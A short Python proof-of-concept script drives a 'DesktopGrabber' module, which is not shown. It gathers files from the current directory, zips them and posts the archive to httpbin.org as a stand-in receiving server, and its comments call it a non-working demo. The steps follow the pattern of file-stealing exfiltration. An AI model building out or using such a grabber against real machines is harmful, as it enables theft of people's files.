
# Importing the file from the same directory.
from DesktopGrabber import *

if __name__ == "__main__":
    # HTTPBin Website PoC
    url = "http://httpbin.org/post"
    # Creates the object.
    agent = DeskGrab("Test", "123")
    # Save all the approved files in "files"
    files = agent._dirTraversel(".")
    # Create the zip.
    create_zip_bool = agent._createZip(files)
    # Send the zip file.. Dosent actually work. Just a HTTPBin
    send_package = agent._sendPackage(url)




